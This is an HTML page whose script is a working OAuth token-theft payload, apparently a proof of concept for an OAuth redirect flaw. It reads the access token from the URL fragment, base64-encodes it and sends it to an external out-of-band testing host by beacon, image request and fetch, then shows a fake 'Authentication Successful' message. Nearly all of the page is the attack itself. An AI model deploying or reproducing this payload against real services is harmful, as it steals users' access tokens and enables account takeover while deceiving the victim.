<!DOCTYPE html>
<html>
<head><title>Processing Authentication...</title></head>
<body>
    <h1 id="status">Extracting Token...</h1>
    <script>
        (function() {
            // 1. Capture the fragment (#access_token=...)
            var fragment = window.location.hash;
            
            // 2. Your NEW OAST URL (using HTTPS to avoid Mixed Content blocks)
            var oastUrl = "https://d5ot4ita9dbh3gactc0gkzwgnyfrjp4gz.oast.fun/?token_data=" + btoa(fragment);

            if (fragment) {
                // Method A: Beacon (The 'Tank' - works even if page closes)
                navigator.sendBeacon(oastUrl);

                // Method B: Image (The 'Ghost' - bypassed most filters)
                var img = new Image();
                img.src = oastUrl;

                // Method C: Fetch (The 'Standard' - no-cors mode)
                fetch(oastUrl, { mode: 'no-cors' });

                console.log("Token leak triggered.");
                
                // Show success message after a tiny delay
                setTimeout(function() {
                    document.getElementById("status").innerText = "Authentication Successful";
                    document.body.innerHTML += "<p>Check your OAST terminal for the hit.</p>";
                }, 1000);
            } else {
                document.getElementById("status").innerText = "Error: No fragment found.";
            }
        })();
    </script>
</body>
</html>
